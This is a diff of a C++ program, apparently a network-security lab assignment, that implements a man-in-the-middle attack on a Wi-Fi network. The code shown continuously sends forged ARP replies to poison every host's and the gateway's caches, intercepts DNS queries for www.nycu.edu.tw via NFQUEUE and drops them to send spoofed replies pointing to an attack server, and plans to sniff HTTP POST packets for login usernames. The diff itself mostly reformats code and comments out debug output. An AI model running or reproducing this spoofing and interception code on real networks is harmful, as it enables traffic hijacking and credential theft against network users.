@@ -29,7 +29,6 @@
 
 using namespace std;
 
-
 #define ETHER_HEADER_LEN sizeof(struct ether_header)
 #define ETHER_ARP_LEN sizeof(struct ether_arp)
 #define ETHER_ARP_PACKET_LEN ETHER_HEADER_LEN + ETHER_ARP_LEN
@@ -39,8 +38,8 @@ using namespace std;
         0xff, 0xff, 0xff, 0xff, 0xff, 0xff \
     }
 
-
-struct dnshdr {
+struct dnshdr
+{
     uint16_t id;
     uint16_t flags;
     /* number of entries in the question section */
@@ -83,7 +82,8 @@ struct ether_arp *fill_arp_request_packet(const unsigned char *src_mac_addr, con
     return arp_packet;
 }
 
-struct ether_arp *fill_arp_reply_packet(const char *src_ip,const unsigned char *src_mac_addr,  const char *dst_ip, const unsigned char *dst_mac_addr){
+struct ether_arp *fill_arp_reply_packet(const char *src_ip, const unsigned char *src_mac_addr, const char *dst_ip, const unsigned char *dst_mac_addr)
+{
     struct ether_arp *arp_packet;
     struct in_addr src_in_addr, dst_in_addr;
     // ip address translation
@@ -105,9 +105,8 @@ struct ether_arp *fill_arp_reply_packet(const char *src_ip,const unsigned char *
     return arp_packet;
 }
 
-
-
-string exec(const char *cmd){
+string exec(const char *cmd)
+{
     array<char, 128> buffer;
     string result;
     unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd, "r"), pclose);
@@ -177,7 +176,6 @@ void receive_arp_reply(int sock_raw_fd)
             break;
         }
     }
-
 }
 void arp_request(const char *if_name, const char *base_ip)
 {
@@ -258,7 +256,6 @@ void arp_request(const char *if_name, const char *base_ip)
     close(sock_raw_fd);
 }
 
-
 void list_devices()
 {
     // get the interface name and gateway IP address
@@ -282,7 +279,7 @@ void list_devices()
         cout << it->first << "\t" << it->second << endl;
     }
 }
-void arp_reply(const char *if_name,const char *src_ip, const unsigned char *src_mac_addr, const char *dst_ip, const unsigned char *dst_mac_addr)
+void arp_reply(const char *if_name, const char *src_ip, const unsigned char *src_mac_addr, const char *dst_ip, const unsigned char *dst_mac_addr)
 {
     struct sockaddr_ll saddr_ll;
     struct ether_header *eth_header;
@@ -329,34 +326,35 @@ void arp_reply(const char *if_name,const char *src_ip, const unsigned char *src_
     close(sock_raw_fd);
 }
 
-void keep_sending_arp_reply( unsigned char *source_mac_char, unsigned char *gateway_mac_char)
+void keep_sending_arp_reply(unsigned char *source_mac_char, unsigned char *gateway_mac_char)
 {
-    while(true){
+    while (true)
+    {
         // iterate all devices
-        for(auto it = devices.begin(); it != devices.end(); ++it){
+        for (auto it = devices.begin(); it != devices.end(); ++it)
+        {
             // if the device is not the gateway and the source
-            if(it->first != gateway_ip && it->first != source_ip){
+            if (it->first != gateway_ip && it->first != source_ip)
+            {
                 // change string of mac to unsigned char[6]
                 unsigned char target_mac_char[6];
                 sscanf(it->second.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
-                    &target_mac_char[0], &target_mac_char[1], &target_mac_char[2],
-                    &target_mac_char[3], &target_mac_char[4], &target_mac_char[5]);
-                
+                       &target_mac_char[0], &target_mac_char[1], &target_mac_char[2],
+                       &target_mac_char[3], &target_mac_char[4], &target_mac_char[5]);
+
                 // arpreply(interface, source_mac, source_ip, dst_ip, dst_mac)
                 // send ARP reply to gateway // trick the gateway we are the victim
                 arp_reply(interface.c_str(), it->first.c_str(), source_mac_char, gateway_ip.c_str(), gateway_mac_char);
                 // send ARP reply to victim  // trick the victim we are the gateway
-                arp_reply(interface.c_str(), gateway_ip.c_str(), source_mac_char, it->first.c_str(), target_mac_char);                
+                arp_reply(interface.c_str(), gateway_ip.c_str(), source_mac_char, it->first.c_str(), target_mac_char);
             }
         }
-        this_thread::sleep_for(chrono::microseconds(500)); 
+        this_thread::sleep_for(chrono::microseconds(500));
     }
-
-
 }
 
 void send_spoofed_dns_reply(char *packet, int len)
-{                  
+{
     // change the destination IP address to 140.113.24.241
     struct iphdr *ip_header = (struct iphdr *)packet;
     // exchange the source and destination IP address
@@ -365,8 +363,8 @@ void send_spoofed_dns_reply(char *packet, int len)
     ip_header->saddr = ip_header->daddr;
     ip_header->daddr = temp.s_addr;
     // cout to check the source and destination IP address
-    cout << "Source IP: " << inet_ntoa(*(in_addr *)&ip_header->saddr) << endl;
-    cout << "Destination IP: " << inet_ntoa(*(in_addr *)&ip_header->daddr) << endl;
+    // cout << "Source IP: " << inet_ntoa(*(in_addr *)&ip_header->saddr) << endl;
+    // cout << "Destination IP: " << inet_ntoa(*(in_addr *)&ip_header->daddr) << endl;
 
     // change the source port and destination port
     struct udphdr *udp_header = (struct udphdr *)(packet + ip_header->ihl * 4);
@@ -375,8 +373,8 @@ void send_spoofed_dns_reply(char *packet, int len)
     udp_header->source = udp_header->dest;
     udp_header->dest = temp_port;
     // cout to check the source and destination port
-    cout << "Source Port: " << ntohs(udp_header->source) << endl;
-    cout << "Destination Port: " << ntohs(udp_header->dest) << endl;
+    // cout << "Source Port: " << ntohs(udp_header->source) << endl;
+    // cout << "Destination Port: " << ntohs(udp_header->dest) << endl;
 
     // change the DNS query to DNS reply
     struct dnshdr *dns_header = (struct dnshdr *)(packet + ip_header->ihl * 4 + sizeof(udphdr));
@@ -393,22 +391,12 @@ void send_spoofed_dns_reply(char *packet, int len)
     // derive the question section
     while (*dns_query != 0)
     {
+        printf("%02x ", (unsigned char)*dns_query);
         dns_query++;
     }
+    cout <<endl;
     dns_query += 5;
     // derive the answer section
-    while (*dns_answer != 0)
-    {
-        dns_answer++;
-    }
-    dns_answer += 5;
-    // derive the question section
-    memcpy(dns_answer, dns_query, strlen(dns_query) + 1);
-    // derive the answer section
-
-
-
-
 }
 static int dns_nfq_packet_handler(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg, struct nfq_data *nfa, void *data)
 {
@@ -425,48 +413,31 @@ static int dns_nfq_packet_handler(struct nfq_q_handle *qh, struct nfgenmsg *nfms
     {
         // dns packet use udp protocol and destionation port 53
         // if detect dns query to www.nycu.edu.tw, then send spoofed DNS reply with IP: 140.113.24.241
-        struct iphdr *ip_header = (struct iphdr *)packet;        
+        struct iphdr *ip_header = (struct iphdr *)packet;
         if (ip_header->protocol == IPPROTO_UDP)
         {
-            //parse the ip header
+            // parse the ip header
             struct udphdr *udp_header = (struct udphdr *)(packet + ip_header->ihl * 4);
-            //parse the udp header
+            // parse the udp header
 
             if (ntohs(udp_header->dest) == 53)
             {
-                //parse the dns header
-                // struct dnshdr *dns_header = (struct dnshdr *)(packet + ip_header->ihl * 4 + sizeof(udphdr));
-                // //parse the dns query
+                // parse the dns header
+                //  struct dnshdr *dns_header = (struct dnshdr *)(packet + ip_header->ihl * 4 + sizeof(udphdr));
+                //  //parse the dns query
 
                 // char *dns_query = (char *)(packet + ip_header->ihl * 4 + sizeof(udphdr) + sizeof(dnshdr));
                 // parse question section: qname qtype qclass
-                char* dns_query = (char*)(packet + ip_header->ihl * 4 + sizeof(udphdr) + sizeof(dnshdr));
-                char* qname = dns_query;
-                while (*qname != 0) {
-                    qname++;
-                }
-                qname += 5;
-                uint16_t qtype = ntohs(*(uint16_t*)(qname));
-                qname += 2;
-                uint16_t qclass = ntohs(*(uint16_t*)(qname));
-
-                // Print the parsed question section
-                cout << "Question Section:" << endl;
-                cout << "QName: " << qname << endl;
-                cout << "QType: " << qtype << endl;
-                cout << "QClass: " << qclass << endl;
-                
-
-
 
 
                 // use stringstream to derive the dns query
                 stringstream ss;
-                for (int i = 0; i < ret; ++i){
+                for (int i = 0; i < ret; ++i)
+                {
                     ss << packet[i];
                 }
                 string dns_query = ss.str();
-                if (dns_query.find("nycu") != string::npos  && dns_query.find("edu") != string::npos && dns_query.find("tw") != string::npos)
+                if (dns_query.find("nycu") != string::npos && dns_query.find("edu") != string::npos && dns_query.find("tw") != string::npos)
                 {
                     cout << "DNS query to www.nycu.edu.tw" << endl;
                     // send the spoofed DNS reply
@@ -474,15 +445,39 @@ static int dns_nfq_packet_handler(struct nfq_q_handle *qh, struct nfgenmsg *nfms
                     send_spoofed_dns_reply(packet, ret);
                     return nfq_set_verdict(qh, id, NF_DROP, 0, NULL);
                 }
+
+                // string str = "";
+                // int dns_start = ip_header->ihl * 4 + sizeof(udphdr);
+                // int name_mv = dns_start + sizeof(dnshdr);
+                // int qname_len = 5; // qry.type 2 and qry.class :2, and final 0 in qname
+                // while (packet[name_mv] != 0)
+                // {
+                //     int part_len = packet[name_mv];
+                //     qname_len += part_len + 1;
+                //     // cout << "len: " << part_len << '\n';
+                //     for (int j = 0; j < part_len; j++)
+                //     {
+                //         name_mv++;
+                //         str += packet[name_mv];
+                //     }
+                //     name_mv++;
+                //     str += '.';
+                // }
+
+                // if (str.find("www.nycu.edu.tw") != string::npos)
+                // {
+                //     cout << "qname_len: " << qname_len << '\n';
+                //     send_spoofed_dns_reply(packet, ret, qname_len);
+                //     return nfq_set_verdict(qh, id, NF_DROP, 0, NULL);
+                // }
             }
         }
-
     }
     return nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);
 }
 
-
-void analyze_packet(){
+void analyze_packet()
+{
     // filter the received packet: HTTP
     // continuously listen to the packets on the interface and filter the HTTP packets
     // analyze the every received HTTP POST packet, findout the packet with "txtUsername"
@@ -557,16 +552,13 @@ void arp_spoofing()
     // task 4 : Intercept DNS requests for a specific web page and generate spoofed DNS replies with the attack server’s IP
     // DNS request(domain name: www.nycu.edu.tw) -> DNS reply(IP: 140.113.24.241)
     thread analyze_thread(analyze_packet);
-    
 
     arp_reply_thread.join();
     analyze_thread.join();
-
-
 }
 
 int main()
-{   
+{
     interface = exec("ip route | grep default | awk '{print $5}'");
     interface.erase(interface.end() - 1);
     // cout << interface << "\n";
@@ -579,7 +571,6 @@ int main()
     // char cmd[100];
     // sprintf(cmd, "iptables -t nat -A POSTROUTING -o %s -j MASQUERADE", interface.c_str());
     // system(cmd);
-
 
     // task 1 : list all devices' IP/MAC addresses in the Wi-Fi network(except the attacker and gateway)
     list_devices();
